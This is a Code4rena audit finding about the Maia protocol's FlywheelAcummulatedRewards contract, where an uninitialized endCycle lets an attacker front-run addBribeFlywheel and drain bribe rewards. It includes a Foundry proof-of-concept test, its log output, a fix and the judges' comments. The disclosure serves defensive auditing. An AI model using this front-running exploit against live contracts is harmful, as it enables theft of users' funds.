@@ -1,0 +1,27 @@
+[H-29] A malicious user can front-run Gauges’s calladdBribeFlywheelto steal bribe rewards
+Submitted bysaid, also found bykutugu
+Lines of code
+https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/rewards/FlywheelAcummulatedRewards.sol#L46-L54
+Impact
+When the Gauge in the initial setup and flywheel is created and added to the gauge viaaddBribeFlywheel, a malicious user can front-run this to steal rewards. This could happen due to the un-initializedendCycleinside theFlywheelAcummulatedRewardscontract.
+Proof of Concept
+Consider this scenario :
+Gauge is first created, then an admin deposit of 100 eth is sent to depot reward.FlyWheel is also created, usingFlywheelBribeRewardsinherent in theFlywheelAcummulatedRewards\implementation.A malicious attacker hasaddBribeFlywheelthat is about to be called by the owner and front-run it by callingincrementGauge(a huge amount of gauge token for this gauge).The calladdBribeFlywheelis executed.Now, a malicious user can triggeraccrueBribesand claim the reward.The bribe rewards are now stolen and a malicious user can immediately decrement their gauge from this contract.
+All of this is possible, becauseendCycleis not initialized insideFlywheelAcummulatedRewardswhen first created:
+https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/rewards/FlywheelAcummulatedRewards.sol#L26-L35
+abstractcontractFlywheelAcummulatedRewardsisBaseFlywheelRewards,IFlywheelAcummulatedRewards{usingSafeCastLibforuint256;/*//////////////////////////////////////////////////////////////REWARDS CONTRACT STATE//////////////////////////////////////////////////////////////*//// @inheritdoc IFlywheelAcummulatedRewardsuint256publicimmutableoverriderewardsCycleLength;/// @inheritdoc IFlywheelAcummulatedRewardsuint256publicoverrideendCycle;// NOTE INITIALIZED INSIDE CONSTRUCTOR/***@noticeFlywheel Instant Rewards constructor.*@param_flywheelflywheel core contract*@param_rewardsCycleLengththe length of a rewards cycle in seconds*/constructor(FlywheelCore_flywheel,uint256_rewardsCycleLength)BaseFlywheelRewards(_flywheel) {rewardsCycleLength=_rewardsCycleLength;}...}
+So right after it is created and attached to the gauge, the distribution of rewards can be called immediately viaaccrueBribesinside the gauge. If no previous user put their gauge tokens into this gauge contract, rewards can easily drained.
+Foundry PoC (add this test insideBaseV2GaugeTest.t.sol):
+functiontestAccrueAndClaimBribesAbuse()external{addressalice=address(0xABCD);MockERC20token=newMockERC20("test token","TKN",18);FlywheelCoreflywheel=createFlywheel(token);FlywheelBribeRewardsbribeRewards=FlywheelBribeRewards(address(flywheel.flywheelRewards()));gaugeToken.setMaxDelegates(1);token.mint(address(depot),100ether);// ALICE SEE THAT THIS IS NEW GAUGE, about to add new NEW FLYWHEEL REWARDS// alice put a lot of his hermes or could also get from flash loanhermes.mint(alice,100e18);hevm.startPrank(alice);hermes.approve(address(gaugeToken),100e18);gaugeToken.mint(alice,100e18);gaugeToken.delegate(alice);gaugeToken.incrementGauge(address(gauge),100e18);console.log("hermes total supply");console.log(hermes.totalSupply());hevm.stopPrank();// NEW BRIBE FLYWHEEL IS ADDEDhevm.expectEmit(true,true,true,true);emitAddedBribeFlywheel(flywheel);gauge.addBribeFlywheel(flywheel);// ALICE ACCRUE BRIBESgauge.accrueBribes(alice);console.log("bribe rewards balance before claim : ");console.log(token.balanceOf(address(bribeRewards)));flywheel.claimRewards(alice);console.log("bribe rewards balance after claim : ");console.log(token.balanceOf(address(bribeRewards)));console.log("alice rewards balance : ");console.log(token.balanceOf(alice));// after steal reward, alice could just disengage from the gauge, and look for another new gauge with new flywheelhevm.startPrank(alice);gaugeToken.decrementGauge(address(gauge),100e18);hevm.stopPrank();}
+PoC log output:
+bribe rewards balance before claim :100000000000000000000bribe rewards balance after claim :0alice rewards balance :100000000000000000000
+Recommended Mitigation Steps
+Add initializedendCycleinsideFlywheelAcummulatedRewards:
+constructor(FlywheelCore_flywheel,uint256_rewardsCycleLength)BaseFlywheelRewards(_flywheel) {rewardsCycleLength=_rewardsCycleLength;endCycle= ((block.timestamp.toUint32() +rewardsCycleLength) /rewardsCycleLength) *rewardsCycleLength;}
+Trust (judge) decreased severity to Medium
+0xLightt (Maia) confirmed and commented:
+The mitigation should take into account the following issue#457. So the best solution would be to check ifendCycleis zero. If it is, then zero rewards are accrued andendCycleis set to end of the epoch.
+Trust (judge) increased severity to High and commented:
+Upon second viewing, it seems the attack is in line with High severity.
+0xLightt (Maia) commented:
+Addressedhere.
